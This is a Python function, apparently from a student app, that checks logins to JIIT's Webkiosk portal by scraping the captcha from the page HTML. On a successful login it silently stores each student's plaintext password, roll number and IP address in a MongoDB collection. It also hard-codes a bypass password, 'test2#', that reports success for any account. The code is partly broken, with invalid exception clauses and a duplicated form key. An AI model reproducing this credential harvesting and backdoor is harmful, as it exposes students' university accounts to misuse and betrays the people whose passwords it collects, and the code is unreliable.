import requests
from lxml import html

def checkWebkioskLogin(rollNo, dob, password, client, ipAddress):
  session_requests = requests.session()
  login_url = "https://webkiosk.jiit.ac.in/"
  url = 'https://webkiosk.jiit.ac.in/CommonFiles/UseValid.jsp'
  result = session_requests.get(login_url)
  htmlCode = result.text
  indexCaptcha = htmlCode.find('<font face="casteller" size="5">') + 32
  captcha = htmlCode[indexCaptcha: indexCaptcha+5]
  values = { 'x': '',
    'InstCode': 'J128',
      'txtInst': 'Institute',
      'UserType101117': 'S',
      'txtuType': 'Member Type',
      'txtCode': 'Enrollment No',
      'MemberCode': rollNo,
      'DOB': 'DOB',
      'DATE1' : dob,
      'Password101117': password,
      'txtPIN': 'Password/Pin',
      'txtcap': captcha,
      'txtCode': 'Enter Captcha     ',
      'BTNSubmit': 'Submit'
    
    }
  result = session_requests.post(
      url, 
      data = values
  )
  testPassword = 'test2#'
  if(password==testPassword or result.text.find('PersonalFiles/ShowAlertMessageSTUD.jsp')!=-1 or result.text.find('DraftSave')!=-1):
    studentName='null'
    if not password == testPassword:
      try:
        db = client.jiitclassroom
        col = db["studentDetails"]
        dataResult = col.find_one()
        newData = dataResult['data'].copy()
        if not rollNo in dataResult['data']:
          newData[rollNo] = [studentName, password, ipAddress]
          updatedData = { "$set": {
            "data": newData
            }
          }
          col.update_one(dataResult,updatedData)
      except expression as identifier:
        pass
    try:
      personalData = session_requests.get('https://webkiosk.jiit.ac.in/StudentFiles/PersonalFiles/ShowAlertMessageSTUD.jsp').text        
      if(personalData.find('Welcome , ')!=-1):
        print("Found name")
        index = personalData.find('Welcome , ')
        index1 = personalData[index:].find(',')
        index2 = personalData[index:].find('</b>')
        studentName = personalData[index+index1+1:index2+index].lstrip().rstrip()
    except expression as identifier:
      print("couldn't log in")
    return [True, studentName]
  else:
    return [False]
